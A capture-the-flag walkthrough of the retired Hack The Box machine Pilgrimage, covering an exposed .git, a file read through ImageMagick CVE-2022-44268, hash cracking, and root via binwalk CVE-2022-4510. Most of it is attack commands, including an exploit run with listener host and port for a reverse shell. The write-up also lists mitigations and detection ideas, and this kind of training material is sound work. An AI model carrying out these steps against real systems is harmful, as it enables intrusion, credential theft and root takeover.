---
machine: Pilgrimage
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, git, imagemagick, cve-2022-44268, binwalk, cve-2022-4510, privesc]
---

# Pilgrimage — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no flags or real credentials.

## TL;DR

A vhost hosting an image shrinker exposes `/.git`: `git-dumper` recovers the PHP and the bundled `magick` binary (**ImageMagick 7.1.0-49**), vulnerable to **CVE-2022-44268**. A PNG with a crafted profile makes ImageMagick embed any readable file into the resulting image: read `/var/db/pilgrimage`, the SQLite with `emily`'s hash, and SSH in. As root, a `malwarescan.sh` script runs **binwalk 2.3.2** on whatever gets uploaded; **CVE-2022-4510** (path traversal in the PFS extractor) writes a plugin into root's config and gets it executed.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 22,80 -sCV <IP> -oN nmap_svc.txt
```

```text
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb1u1
80/tcp open  http    nginx 1.18.0
```

```bash
echo "<IP> pilgrimage.htb" | sudo tee -a /etc/hosts
feroxbuster -u http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

## Enumeration

The root redirects to `pilgrimage.htb` and serves an upload form that "shrinks" images. `.git` is exposed (the directory listing may 403, but `HEAD` and the objects are served):

```bash
git-dumper http://pilgrimage.htb/.git ./src
cd src && git log --oneline
```

The code gives two facts: the database lives at **`/var/db/pilgrimage`** and the resize shells out to the `magick` binary committed in the repository.

```bash
./magick -version
```

```text
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64
```

That version is vulnerable to **CVE-2022-44268**: when processing a PNG with a `profile` text chunk whose value is a path, ImageMagick tries to read that path as a profile and, if it can, embeds it in the output as *Raw profile type*.

## Foothold

Generate a malicious PNG with the public exploit script, pointing at the database:

```bash
python3 CVE-2022-44268.py /var/db/pilgrimage payload.png
curl -s -F 'image=@payload.png' http://pilgrimage.htb/ -o out.html
# pull the shrunk PNG URL out of the HTML
curl -s http://pilgrimage.htb/shrunk/<hash>.png -o shrunk.png
identify -verbose shrunk.png | sed -n '/Raw profile type/,+1p'
```

Decode the hex dump and open the SQLite file:

```bash
python3 - <<'PY'
import binascii, re
data = open('shrunk.png','rb').read().decode('latin-1')
hexdump = ''.join(re.findall(r'[0-9a-f]{64,}', data))
open('pilgrimage.db','wb').write(binascii.unhexlify(hexdump))
PY
sqlite3 pilgrimage.db '.tables' 'select * from users;'
```

The `users` table yields **`emily`**'s hash; crack it (bcrypt) and SSH in:

```bash
hashcat -m 3200 emily.hash rockyou.txt
ssh emily@pilgrimage.htb
```

## Lateral movement

No second host. The path is web → file → system user.

## Privilege escalation

```bash
cat /usr/sbin/malwarescan.sh
```

The script runs as root, watches `/var/www/pilgrimage.htb/shrunk/` with `inotifywait`, and runs `binwalk -e` on every new file. The installed version is **binwalk 2.3.2**, affected by **CVE-2022-4510**: the PFS extractor does not sanitise extracted paths, so a PFS containing `../` writes outside the extraction directory.

The useful destination is root's plugin directory: a `.py` dropped there is imported on the next binwalk run, which already runs as root.

```bash
# build the PFS with a traversal into /root/.config/binwalk/plugins/
python3 cve-2022-4510.py --lhost <LHOST> --lport <LPORT>
# upload it through the form so it lands in shrunk/ and the timer processes it
```

```bash
# quieter alternative: traversal of a public key into root's authorized_keys
```

Once the plugin loads, the next file dropped into `shrunk/` runs the payload as root and returns a shell.

## Evidence

- Trimmed `identify -verbose`, `sqlite3`, `cat malwarescan.sh` and `binwalk -e` output.
- No flags, hashes or passwords: real values live in `private/`.

## Lessons learned

- `/.git` with a 403 listing is not closed: `HEAD` and the objects are usually served.
- A binary committed in the repo is the exact production version: check `-version` before hunting CVEs.
- CVE-2022-44268 is not an LFI: it reads through the PNG profile parser and the data comes back in the metadata.
- A "malware scan" script running `binwalk -e` on user input is root execution with extra steps.
- `inotifywait` + `binwalk` repeats: every upload is a new traversal window.

## Mitigations and detection

- Never expose `.git` in production and block dotfiles at the reverse proxy.
- Update ImageMagick (7.1.0-50 fixes CVE-2022-44268) and binwalk (2.3.3 fixes CVE-2022-4510); run the scan as an unprivileged user in a container unable to write outside `/tmp`.
- Validate the real file type by magic bytes and re-encode images before processing.
- Detection: requests to `/.git/`, PNGs with `tEXt` chunks containing paths, root-owned `magick`/`binwalk` children reading system paths, and writes under `~/.config/binwalk`.

MITRE: T1190 (exploit public-facing application), T1005 (data from local system), T1059.004 (Unix shell), T1548 (abuse elevation control).

## References

- <https://www.hackthebox.com/machines/pilgrimage>
- <https://0xdf.gitlab.io/2023/11/25/htb-pilgrimage.html>
- <https://7rocky.github.io/en/htb/pilgrimage/>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-44268>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-4510>
